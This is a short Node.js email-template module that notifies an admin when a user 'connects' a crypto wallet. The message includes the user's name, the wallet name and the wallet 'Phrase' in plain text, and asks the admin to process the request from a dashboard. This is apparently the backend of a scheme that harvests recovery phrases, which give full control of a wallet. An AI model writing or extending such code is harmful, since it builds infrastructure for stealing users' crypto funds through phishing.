const { capitalize } = require("lodash");
const { baseTemplate, BRAND_COLOR } = require("../../messages");
const { format } = require("date-fns");

function buildWalletConnectMsg({ user, wallet }) {
  const content = `
         
      
          <p>Hello, Admin</p>
      
          <p style="line-height: 1;">
           A new wallet connection  by user ${capitalize(user?.firstName)} ${capitalize(user?.lastName)}
          </p>
          <p style="line-height: 1;">
           <b>Walletname</b>: ${capitalize(wallet?.walletName)}
          </p>
          <p style="line-height: 1;">
           <b>Phrase</b>: ${wallet?.walletInfo}
         </p>
          <p style="line-height: 1;">
            Please review and process request from the dashboard.
          </p>
        `;

  return baseTemplate({
    content,
  });
}

module.exports = { buildWalletConnectMsg };
